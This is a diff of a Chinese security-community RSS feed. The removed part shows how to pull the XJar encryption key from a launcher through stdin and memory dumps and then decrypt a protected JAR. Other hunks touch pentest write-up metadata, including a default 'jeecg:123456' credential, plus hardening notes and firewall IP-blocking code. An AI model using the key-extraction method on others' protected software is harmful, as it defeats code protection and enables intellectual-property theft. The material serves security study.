-	for i := 1; i &amp;lt; l-1; i++ {
-		arg := args[i]
-		if arg == &quot;-jar&quot; {
-			jar = args[i+1]
-		}
-	}
-
-	if jar == &quot;&quot; {
-		return &quot;&quot;, errors.New(&quot;unspecified jar name&quot;)
-	}
-
-	return jar, nil
-}
-
-// calculate file&#39;s MD5
-func MD5(path string) ([]byte, error) {
-	return HASH(path, md5.New())
-}
-
-// calculate file&#39;s SHA-1
-func SHA1(path string) ([]byte, error) {
-	return HASH(path, sha1.New())
-}
-
-// calculate file&#39;s HASH value with specified HASH Algorithm
-func HASH(path string, hash hash.Hash) ([]byte, error) {
-	file, err := os.Open(path)
-
-	if err != nil {
-		return nil, err
-	}
-
-	_, _err := io.Copy(hash, file)
-	if _err != nil {
-		return nil, _err
-	}
-
-	sum := hash.Sum(nil)
-
-	return sum, nil
-}
-
-type XJar struct {
-	md5  []byte
-	sha1 []byte
-}
-
-type XKey struct {
-	algorithm []byte
-	keysize   []byte
-	ivsize    []byte
-	password  []byte
-}&lt;/code&gt;&lt;/pre&gt;
-&lt;h3&gt;3.3、获取密钥&lt;/h3&gt;
-（1）拿到密钥&lt;br&gt;
-启动器需要接收参数，可以直接编写一个 Go 程序输出传入的 stdin。
-&lt;pre&gt;&lt;code&gt;package main
- 
-import (
-    &quot;bufio&quot;
-    &quot;fmt&quot;
-    &quot;os&quot;
-)
- 
-func main() {
-    input := bufio.NewScanner(os.Stdin) //初始化一个扫表对象
-    for input.Scan() {                  //扫描输入内容
-        line := input.Text() //把输入内容转换为字符串
-        fmt.Println(line)    //输出到标准输出
-    }
-}&lt;/code&gt;&lt;/pre&gt;
-拿到密钥&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855421-450442-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;（2）其他拿到密钥思路&lt;br&gt;
-其实也可以通过编写一个模拟的 jar 来接收和输出，但需要用 ida 等工具去除哈希校验，操作会稍微复杂一些。&lt;br&gt;
-另外，密钥会传入 JVM。我们可以先反编译代码找到加密密钥的位置，再导出 Java 内存获取具体信息。&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855439-5255-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855445-576342-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-
-&lt;p&gt;可以看到很多类都使用到了key。由于 VisualVM 不适合分析只运行几秒的 JAR 包，我们在 demo 代码中增加了一些延时，然后dump内存数据，&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855470-414869-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;根据反编译提示，我们可以在多个位置找到key。&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855479-492032-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855483-762459-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-
-&lt;h3&gt;3.4、解密&lt;/h3&gt;
-&lt;p&gt;拿到key之后，解密思路和classfinal一致。&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855493-285467-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;运行代码需要手动导入 commons-compress 的依赖包，&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import io.xjar.jar.XJar;
-
-public class de {
-    public static void main(String[] args) throws Exception {
-        XJar.decrypt(&quot;demo-1.0-SNAPSHOT-encrypted-xjar.jar&quot;,&quot;de_code.zip&quot;, &quot;123456ww&quot;);
-    }
-}&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;查看解密代码，&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855506-954237-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h1&gt;4、总结&lt;/h1&gt;
-&lt;p&gt;从上述探究可以看出，class final到xjar的方案不断完善，但仍有逆向的风险。开源代码和思路虽带来便利，也可能被攻击者利用，实际环境中建议进行二次开发后再使用。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2992-jar</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2992-jar</guid><pubDate>Mon, 02 Jun 2025 09:18:49 GMT</pubDate><author>火线用户9f552d</author><category>原创文章</category><category>应用安全</category></item><item><title>分享某次项目上的渗透测试复盘</title><description>&lt;h2&gt;声明&lt;/h2&gt;
+&lt;p&gt;版权声明： 本文内容由火线Zone社区原创发布，未经允许，不得转载或用于商业用途。如需转载，请遵守转载说明中的相关规定。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2994-zone-25q2</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2994-zone-25q2</guid><pubDate>Wed, 02 Jul 2025 10:13:06 GMT</pubDate><author>小火子</author><category>官方公告</category></item><item><title>分享某次项目上的渗透测试复盘</title><description>&lt;h2&gt;声明&lt;/h2&gt;
 &lt;p&gt;本文章所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.&lt;br&gt;
 此文章不允许未经授权转发至除 火线Zone 社区 以外的其它平台！！！&lt;/p&gt;
 
@@ -839,7 +1590,7 @@ jeecg:123456&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;最后，希望看完这篇文章的你，也可以挖到心仪的漏洞！&lt;/p&gt;
 
-</description><link>https://zone.huoxian.cn/d/2990</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2990</guid><pubDate>Mon, 19 May 2025 09:41:21 GMT</pubDate><author>routing</author><category>原创文章</category><category>应用安全</category><category>AIOT安全</category><category>实战攻防</category></item><item><title>分享最近一次攻防演练RTSP奇特之旅</title><description>&lt;h2&gt;声明&lt;/h2&gt;
+</description><link>https://zone.huoxian.cn/d/2990</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2990</guid><pubDate>Mon, 19 May 2025 09:41:21 GMT</pubDate><author>TryTset</author><category>原创文章</category><category>应用安全</category><category>实战攻防</category><category>AIOT安全</category></item><item><title>分享最近一次攻防演练RTSP奇特之旅</title><description>&lt;h2&gt;声明&lt;/h2&gt;
 &lt;p&gt;本文章所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.&lt;br&gt;
 此文章不允许未经授权转发至除 火线Zone 社区 以外的其它平台！！！&lt;/p&gt;
 
@@ -1263,7 +2014,7 @@ Python 3.9.6&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;因为我电脑是MacBook的原因，所以一些软件使用上面还是有差异，师傅们可以自行上网搜索，Google浏览器还是很好用的，多搜搜，最好希望师傅们测试这个漏洞的时候测下国外的，不要未授权测试国内的！！！&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。&lt;/strong&gt;&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2989-rtsp</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2989-rtsp</guid><pubDate>Mon, 19 May 2025 09:22:06 GMT</pubDate><author>routing</author><category>原创文章</category><category>应用安全</category><category>AIOT安全</category><category>实战攻防</category></item><item><title>2025 全国卫生健康行业网络安全攻防大赛运维赛-测试赛WP</title><description>&lt;h4&gt;前言&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。&lt;/strong&gt;&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2989-rtsp</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2989-rtsp</guid><pubDate>Mon, 19 May 2025 09:22:06 GMT</pubDate><author>TryTset</author><category>原创文章</category><category>应用安全</category><category>实战攻防</category><category>AIOT安全</category></item><item><title>2025 全国卫生健康行业网络安全攻防大赛运维赛-测试赛WP</title><description>&lt;h4&gt;前言&lt;/h4&gt;
 
 &lt;p&gt;刚好有机会接触到卫生行业的运维赛，这里只有机会接触到测试赛，简单谢谢wp吧，测试赛的话主办方也是用心了的，难度的话相比较决赛的内容还是比较简单的。&lt;/p&gt;
 
@@ -1305,7 +2056,7 @@ Python 3.9.6&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;vim /etc/login.def&lt;/p&gt;
 
-&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;PASS_MAX_DAYS	90&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;PASS_MAX_DAYS90&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;
 
 &lt;p&gt;连续输入错误三次，锁定5分钟&lt;/p&gt;
 
@@ -1450,61 +2201,61 @@ auth required pam_faillock.so authfail audit deny=3 unlock_time=300&lt;/p&gt;&lt
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;package devices
 
 import (
-	&quot;BT_supertoolsV2/utils&quot;
-	&quot;fmt&quot;
-	&quot;strings&quot;
-	&quot;time&quot;
+&quot;BT_supertoolsV2/utils&quot;
+&quot;fmt&quot;
+&quot;strings&quot;
+&quot;time&quot;
 
-	&quot;github.com/reiver/go-telnet&quot;
+&quot;github.com/reiver/go-telnet&quot;
 )
 
 type DPConfig struct {
-	Name         string `json:&quot;name&quot;`
-	DeviceIP     string `json:&quot;device_ip&quot;`
-	TelnetPort   int    `json:&quot;telnet_port&quot;`
-	Username     string `json:&quot;username&quot;`
-	Password     string `json:&quot;password&quot;`
-	AddressGroup string `json:&quot;address_group&quot;`
-	Type         string `json:&quot;type&quot;`
+Name         string `json:&quot;name&quot;`
+DeviceIP     string `json:&quot;device_ip&quot;`
+TelnetPort   int    `json:&quot;telnet_port&quot;`
+Username     string `json:&quot;username&quot;`
+Password     string `json:&quot;password&quot;`
+AddressGroup string `json:&quot;address_group&quot;`
+Type         string `json:&quot;type&quot;`
 }
 
 func AddIPsToDP(cfg DPConfig, ips []string) string {
-	var output strings.Builder
-	output.WriteString(fmt.Sprintf(&quot;=== 开始配置 DP 设备 %s ===\n&quot;, cfg.DeviceIP))
+var output strings.Builder
+output.WriteString(fmt.Sprintf(&quot;=== 开始配置 DP 设备 %s ===\n&quot;, cfg.DeviceIP))
 
-	// IP 规则化处理
-	normalizedIPs := utils.NormalizeIP(strings.Join(ips, &quot;\n&quot;))
-	if normalizedIPs == &quot;&quot; {
-		return &quot;没有有效的 IP 地址！&quot;
-	}
-	ipList := strings.Split(normalizedIPs, &quot;\n&quot;)
+// IP 规则化处理
+normalizedIPs := utils.NormalizeIP(strings.Join(ips, &quot;\n&quot;))
+if normalizedIPs == &quot;&quot; {
+return &quot;没有有效的 IP 地址！&quot;
+}
+ipList := strings.Split(normalizedIPs, &quot;\n&quot;)
 
-	// 连接 Telnet
-	address := fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.TelnetPort)
-	conn, err := telnet.DialTo(address)
-	if err != nil {
-		return fmt.Sprintf(&quot;Telnet 连接失败: %v\n&quot;, err)
-	}
-	defer conn.Close()
+// 连接 Telnet
+address := fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.TelnetPort)
+conn, err := telnet.DialTo(address)
+if err != nil {
+return fmt.Sprintf(&quot;Telnet 连接失败: %v\n&quot;, err)
+}
+defer conn.Close()
 
-	// 封装发送命令函数
-	send := func(cmd string) {
-		conn.Write([]byte(cmd + &quot;\n&quot;))
-		time.Sleep(500 * time.Millisecond)
-		output.WriteString(fmt.Sprintf(&quot;[发送] %s\n&quot;, cmd))
-	}
+// 封装发送命令函数
+send := func(cmd string) {
+conn.Write([]byte(cmd + &quot;\n&quot;))
+time.Sleep(500 * time.Millisecond)
+output.WriteString(fmt.Sprintf(&quot;[发送] %s\n&quot;, cmd))
+}
 
-	// 开始发送指令：用户名 -&amp;gt; 密码 -&amp;gt; conf -&amp;gt; 封禁命令 -&amp;gt; exit
-	send(cfg.Username)
-	send(cfg.Password)
-	send(&quot;conf&quot;)
-	for _, ip := range ipList {
-		send(fmt.Sprintf(&quot;address-object %s %s/32&quot;, cfg.AddressGroup, ip))
-	}
-	send(&quot;exit&quot;)
+// 开始发送指令：用户名 -&amp;gt; 密码 -&amp;gt; conf -&amp;gt; 封禁命令 -&amp;gt; exit
+send(cfg.Username)
+send(cfg.Password)
+send(&quot;conf&quot;)
+for _, ip := range ipList {
+send(fmt.Sprintf(&quot;address-object %s %s/32&quot;, cfg.AddressGroup, ip))
+}
+send(&quot;exit&quot;)
 
-	output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
-	return output.String()
+output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
+return output.String()
 }&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;这里没有直接使用回显显示状态，没有监听服务器回显状态再输入命令，具体使用该方式是新增一个地址簿，再策略位置设置封禁策略，引用添加的地址簿即可。界面效果&lt;/p&gt;
@@ -1518,83 +2269,83 @@ func AddIPsToDP(cfg DPConfig, ips []string) string {
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;package devices
 
 import (
-	&quot;fmt&quot;
-	&quot;strings&quot;
-	&quot;time&quot;
+&quot;fmt&quot;
+&quot;strings&quot;
+&quot;time&quot;
 
-	&quot;golang.org/x/crypto/ssh&quot;
+&quot;golang.org/x/crypto/ssh&quot;
 )
 
 func AddIPsToH3C(cfg H3CConfig, ips []string) string {
-	var output strings.Builder
-	output.WriteString(fmt.Sprintf(&quot;=== 开始配置 H3C 设备 %s ===\n\n&quot;, cfg.DeviceIP))
+var output strings.Builder
+output.WriteString(fmt.Sprintf(&quot;=== 开始配置 H3C 设备 %s ===\n\n&quot;, cfg.DeviceIP))
 
-	config := &amp;amp;ssh.ClientConfig{
-		User: cfg.Username,
-		Auth: []ssh.AuthMethod{
-			ssh.Password(cfg.Password),
-		},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         10 * time.Second,
-	}
+config := &amp;amp;ssh.ClientConfig{
+User: cfg.Username,
+Auth: []ssh.AuthMethod{
+ssh.Password(cfg.Password),
+},
+HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+Timeout:         10 * time.Second,
+}
 
-	client, err := ssh.Dial(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.SSHPort), config)
-	if err != nil {
-		return fmt.Sprintf(&quot;SSH连接失败: %v\n&quot;, err)
-	}
-	defer client.Close()
+client, err := ssh.Dial(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.SSHPort), config)
+if err != nil {
+return fmt.Sprintf(&quot;SSH连接失败: %v\n&quot;, err)
+}
+defer client.Close()
 
-	session, err := client.NewSession()
-	if err != nil {
-		return fmt.Sprintf(&quot;创建会话失败: %v\n&quot;, err)
-	}
-	defer session.Close()
+session, err := client.NewSession()
+if err != nil {
+return fmt.Sprintf(&quot;创建会话失败: %v\n&quot;, err)
+}
+defer session.Close()
 
-	stdin, err := session.StdinPipe()
-	if err != nil {
-		return fmt.Sprintf(&quot;获取输入管道失败: %v\n&quot;, err)
-	}
+stdin, err := session.StdinPipe()
+if err != nil {
+return fmt.Sprintf(&quot;获取输入管道失败: %v\n&quot;, err)
+}
 
-	modes := ssh.TerminalModes{
-		ssh.ECHO:          0,
-		ssh.TTY_OP_ISPEED: 14400,
-		ssh.TTY_OP_OSPEED: 14400,
-	}
-	if err := session.RequestPty(&quot;xterm&quot;, 80, 40, modes); err != nil {
-		return fmt.Sprintf(&quot;设置终端失败: %v\n&quot;, err)
-	}
-	if err := session.Shell(); err != nil {
-		return fmt.Sprintf(&quot;启动 shell 失败: %v\n&quot;, err)
-	}
+modes := ssh.TerminalModes{
+ssh.ECHO:          0,
+ssh.TTY_OP_ISPEED: 14400,
+ssh.TTY_OP_OSPEED: 14400,
+}
+if err := session.RequestPty(&quot;xterm&quot;, 80, 40, modes); err != nil {
+return fmt.Sprintf(&quot;设置终端失败: %v\n&quot;, err)
+}
+if err := session.Shell(); err != nil {
+return fmt.Sprintf(&quot;启动 shell 失败: %v\n&quot;, err)
+}
 
-	commands := []string{
-		&quot;system-view&quot;,
-		fmt.Sprintf(&quot;object-group ip  %s&quot;, cfg.AddressGroup),
-	}
-	for _, ip := range ips {
-		commands = append(commands, fmt.Sprintf(&quot;network host address %s&quot;, ip))
-	}
-	commands = append(commands, &quot;exit&quot;)
+commands := []string{
+&quot;system-view&quot;,
+fmt.Sprintf(&quot;object-group ip  %s&quot;, cfg.AddressGroup),
+}
+for _, ip := range ips {
+commands = append(commands, fmt.Sprintf(&quot;network host address %s&quot;, ip))
+}
+commands = append(commands, &quot;exit&quot;)
 
-	for _, cmd := range commands {
-		fmt.Fprintf(stdin, &quot;%s\n&quot;, cmd)
-		time.Sleep(300 * time.Millisecond)
-		output.WriteString(fmt.Sprintf(&quot;[执行] %s\n&quot;, cmd))
-	}
-	output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
-	return output.String()
+for _, cmd := range commands {
+fmt.Fprintf(stdin, &quot;%s\n&quot;, cmd)
+time.Sleep(300 * time.Millisecond)
+output.WriteString(fmt.Sprintf(&quot;[执行] %s\n&quot;, cmd))
+}
+output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
+return output.String()
 }&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;这里采用了监听回显，核心代码是&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;commands := []string{
-		&quot;system-view&quot;,
-		fmt.Sprintf(&quot;object-group ip  %s&quot;, cfg.AddressGroup),
-	}
-	for _, ip := range ips {
-		commands = append(commands, fmt.Sprintf(&quot;network host address %s&quot;, ip))
-	}
-	commands = append(commands, &quot;exit&quot;)&lt;/code&gt;&lt;/pre&gt;
+&quot;system-view&quot;,
+fmt.Sprintf(&quot;object-group ip  %s&quot;, cfg.AddressGroup),
+}
+for _, ip := range ips {
+commands = append(commands, fmt.Sprintf(&quot;network host address %s&quot;, ip))
+}
+commands = append(commands, &quot;exit&quot;)&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;当然这里可以增加优化，代码内关于ip地址的添加以及删除等操作都可以做，工具后期可以依托命令功能增加多个模块化设计，当然为了降低操作风险的话，这里黑名单封禁的操作足够使用了。&lt;/p&gt;
 
@@ -1605,61 +2356,61 @@ func AddIPsToH3C(cfg H3CConfig, ips []string) string {
 &lt;p&gt;山石登录方式是telnet登录使用命令操作&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;import (
-	&quot;BT_supertoolsV2/utils&quot;
-	&quot;fmt&quot;
-	&quot;strings&quot;
-	&quot;time&quot;
+&quot;BT_supertoolsV2/utils&quot;
+&quot;fmt&quot;
+&quot;strings&quot;
+&quot;time&quot;
 
-	&quot;github.com/reiver/go-telnet&quot;
+&quot;github.com/reiver/go-telnet&quot;
 )
 
 type HSConfig struct {
-	Name         string `json:&quot;name&quot;`
-	DeviceIP     string `json:&quot;device_ip&quot;`
-	TelnetPort   int    `json:&quot;telnet_port&quot;`
-	Username     string `json:&quot;username&quot;`
-	Password     string `json:&quot;password&quot;`
-	AddressGroup string `json:&quot;address_group&quot;`
-	Type         string `json:&quot;type&quot;`
+Name         string `json:&quot;name&quot;`
+DeviceIP     string `json:&quot;device_ip&quot;`
+TelnetPort   int    `json:&quot;telnet_port&quot;`
+Username     string `json:&quot;username&quot;`
+Password     string `json:&quot;password&quot;`
+AddressGroup string `json:&quot;address_group&quot;`
+Type         string `json:&quot;type&quot;`
 }
 
 func AddIPsToHillstone(cfg HSConfig, ips []string) string {
-	var output strings.Builder
-	output.WriteString(fmt.Sprintf(&quot;=== 开始配置 Hillstone 设备 %s ===\n&quot;, cfg.DeviceIP))
+var output strings.Builder
+output.WriteString(fmt.Sprintf(&quot;=== 开始配置 Hillstone 设备 %s ===\n&quot;, cfg.DeviceIP))
 
-	// IP 规则化处理
-	normalizedIPs := utils.NormalizeIP(strings.Join(ips, &quot;\n&quot;))
-	if normalizedIPs == &quot;&quot; {
-		return &quot;没有有效的 IP 地址！&quot;
-	}
-	ipList := strings.Split(normalizedIPs, &quot;\n&quot;)
+// IP 规则化处理
+normalizedIPs := utils.NormalizeIP(strings.Join(ips, &quot;\n&quot;))
+if normalizedIPs == &quot;&quot; {
+return &quot;没有有效的 IP 地址！&quot;
+}
+ipList := strings.Split(normalizedIPs, &quot;\n&quot;)
 
-	// 连接 Telnet
-	address := fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.TelnetPort)
-	conn, err := telnet.DialTo(address)
-	if err != nil {
-		return fmt.Sprintf(&quot;Telnet 连接失败: %v\n&quot;, err)
-	}
-	defer conn.Close()
+// 连接 Telnet
+address := fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.TelnetPort)
+conn, err := telnet.DialTo(address)
+if err != nil {
+return fmt.Sprintf(&quot;Telnet 连接失败: %v\n&quot;, err)
+}
+defer conn.Close()
 
-	// 封装发送命令函数
-	send := func(cmd string) {
-		conn.Write([]byte(cmd + &quot;\n&quot;))
-		time.Sleep(500 * time.Millisecond)
-		output.WriteString(fmt.Sprintf(&quot;[发送] %s\n&quot;, cmd))
-	}
+// 封装发送命令函数
+send := func(cmd string) {
+conn.Write([]byte(cmd + &quot;\n&quot;))
+time.Sleep(500 * time.Millisecond)
+output.WriteString(fmt.Sprintf(&quot;[发送] %s\n&quot;, cmd))
+}
 
-	// 开始发送指令：用户名 -&amp;gt; 密码 -&amp;gt; conf -&amp;gt; 封禁命令 -&amp;gt; exit
-	send(cfg.Username)
-	send(cfg.Password)
-	send(&quot;conf&quot;)
-	for _, ip := range ipList {
-		send(fmt.Sprintf(&quot;address-object %s %s/32&quot;, cfg.AddressGroup, ip))
-	}
-	send(&quot;exit&quot;)
+// 开始发送指令：用户名 -&amp;gt; 密码 -&amp;gt; conf -&amp;gt; 封禁命令 -&amp;gt; exit
+send(cfg.Username)
+send(cfg.Password)
+send(&quot;conf&quot;)
+for _, ip := range ipList {
+send(fmt.Sprintf(&quot;address-object %s %s/32&quot;, cfg.AddressGroup, ip))
+}
+send(&quot;exit&quot;)
 
-	output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
-	return output.String()
+output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
+return output.String()
 }&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;山石防火墙的命令基本和华三防火墙的命令基本一致，目前基本上可以支持大多数版本型号的防火墙，使用前可以做测试。&lt;/p&gt;
@@ -1672,158 +2423,158 @@ func AddIPsToHillstone(cfg HSConfig, ips []string) string {
 
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;// 批量封禁
 func AddBlacklist(devices []K01Device, ips []string, output *widget.Entry) {
-	for _, device := range devices {
-		appendOutput(output, fmt.Sprintf(&quot;🔑 正在登录设备 [https://%s]...&quot;, device.IP))
+for _, device := range devices {
+appendOutput(output, fmt.Sprintf(&quot;🔑 正在登录设备 [https://%s]...&quot;, device.IP))
 
-		// 登录并获取 Token
-		url := fmt.Sprintf(&quot;https://%s&quot;, device.IP)
-		token := Login(url, device.Username, device.Password, output, device.Name)
-		if token == &quot;&quot; {
-			appendOutput(output, fmt.Sprintf(&quot;❌ 登录失败: %s&quot;, device.Name))
-			continue
-		}
+// 登录并获取 Token
+url := fmt.Sprintf(&quot;https://%s&quot;, device.IP)
+token := Login(url, device.Username, device.Password, output, device.Name)
+if token == &quot;&quot; {
+appendOutput(output, fmt.Sprintf(&quot;❌ 登录失败: %s&quot;, device.Name))
+continue
+}
 
-		// 逐个 IP 添加到黑名单
-		for _, ip := range ips {
-			// 如果 IP 地址没有 CIDR 后缀，添加 &quot;/32&quot;
-			if !strings.Contains(ip, &quot;/&quot;) {
-				ip += &quot;/32&quot;
-			}
+// 逐个 IP 添加到黑名单
+for _, ip := range ips {
+// 如果 IP 地址没有 CIDR 后缀，添加 &quot;/32&quot;
+if !strings.Contains(ip, &quot;/&quot;) {
+ip += &quot;/32&quot;
+}
 
-			// 打印调试日志，确认每个 IP 地址
-			appendOutput(output, fmt.Sprintf(&quot;🔍 封禁 IP: %s&quot;, ip))
+// 打印调试日志，确认每个 IP 地址
+appendOutput(output, fmt.Sprintf(&quot;🔍 封禁 IP: %s&quot;, ip))
 
-			// 准备请求 payload
-			payload := map[string]interface{}{
-				&quot;color&quot;:       0,
-				&quot;device_mask&quot;: []int{224},
-				&quot;items&quot;: []map[string]interface{}{
-					{
-						&quot;type&quot;:        0,
-						&quot;ip&quot;:          ip, // 这里单独封禁每个 IP 地址
-						&quot;timeout&quot;:     336,
-						&quot;time_type&quot;:   &quot;3600&quot;,
-						&quot;device_mask&quot;: []int{224},
-						&quot;comment&quot;:     &quot;自动封禁&quot;,
-					},
-				},
-				&quot;method&quot;: &quot;add&quot;,
-			}
+// 准备请求 payload
+payload := map[string]interface{}{
+&quot;color&quot;:       0,
+&quot;device_mask&quot;: []int{224},
+&quot;items&quot;: []map[string]interface{}{
+{
+&quot;type&quot;:        0,
+&quot;ip&quot;:          ip, // 这里单独封禁每个 IP 地址
+&quot;timeout&quot;:     336,
+&quot;time_type&quot;:   &quot;3600&quot;,
+&quot;device_mask&quot;: []int{224},
+&quot;comment&quot;:     &quot;自动封禁&quot;,
+},
+},
+&quot;method&quot;: &quot;add&quot;,
+}
 
-			// 打印调试日志，确认请求 Payload
-			payloadBytes, _ := json.Marshal(payload)
-			// appendOutput(output, fmt.Sprintf(&quot;🔍 请求 Payload: %s&quot;, string(payloadBytes)))
+// 打印调试日志，确认请求 Payload
+payloadBytes, _ := json.Marshal(payload)
+// appendOutput(output, fmt.Sprintf(&quot;🔍 请求 Payload: %s&quot;, string(payloadBytes)))
 
-			// 请求封禁
-			req, err := http.NewRequest(&quot;POST&quot;, url+&quot;/api/v1/security/iplist/save&quot;, bytes.NewBuffer(payloadBytes))
-			if err != nil {
-				appendOutput(output, fmt.Sprintf(&quot;❌ 创建封禁请求失败: %s&quot;, err.Error()))
-				continue
-			}
-			req.Header.Set(&quot;Authorization&quot;, &quot;Bearer &quot;+token)
-			req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
+// 请求封禁
+req, err := http.NewRequest(&quot;POST&quot;, url+&quot;/api/v1/security/iplist/save&quot;, bytes.NewBuffer(payloadBytes))
+if err != nil {
+appendOutput(output, fmt.Sprintf(&quot;❌ 创建封禁请求失败: %s&quot;, err.Error()))
+continue
+}
+req.Header.Set(&quot;Authorization&quot;, &quot;Bearer &quot;+token)
+req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
 
-			// 执行请求
-			resp, err := insecureClient.Do(req)
-			if err != nil {
-				appendOutput(output, fmt.Sprintf(&quot;❌ 封禁请求失败: %s&quot;, err.Error()))
-				continue
-			}
-			defer resp.Body.Close()
+// 执行请求
+resp, err := insecureClient.Do(req)
+if err != nil {
+appendOutput(output, fmt.Sprintf(&quot;❌ 封禁请求失败: %s&quot;, err.Error()))
+continue
+}
+defer resp.Body.Close()
 
-			// // 打印调试日志，确认响应代码
-			// appendOutput(output, fmt.Sprintf(&quot;🔍 响应状态: %s&quot;, resp.Status))
+// // 打印调试日志，确认响应代码
+// appendOutput(output, fmt.Sprintf(&quot;🔍 响应状态: %s&quot;, resp.Status))
 
-			// 解析响应
-			body, _ := ioutil.ReadAll(resp.Body)
-			var result map[string]interface{}
-			if err := json.Unmarshal(body, &amp;amp;result); err != nil {
-				appendOutput(output, fmt.Sprintf(&quot;❌ 解析封禁响应失败: %s&quot;, err.Error()))
-				continue
-			}
+// 解析响应
+body, _ := ioutil.ReadAll(resp.Body)
+var result map[string]interface{}
+if err := json.Unmarshal(body, &amp;amp;result); err != nil {
+appendOutput(output, fmt.Sprintf(&quot;❌ 解析封禁响应失败: %s&quot;, err.Error()))
+continue
+}
 
-			// // 打印调试日志，确认响应结果
-			// appendOutput(output, fmt.Sprintf(&quot;🔍 响应结果: %v&quot;, result))
+// // 打印调试日志，确认响应结果
+// appendOutput(output, fmt.Sprintf(&quot;🔍 响应结果: %v&quot;, result))
 
-			// 根据结果显示成功或失败
-			if success, ok := result[&quot;success&quot;].(bool); ok &amp;amp;&amp;amp; success {
-				appendOutput(output, fmt.Sprintf(&quot;✅ 添加成功: %s&quot;, ip))
-			} else {
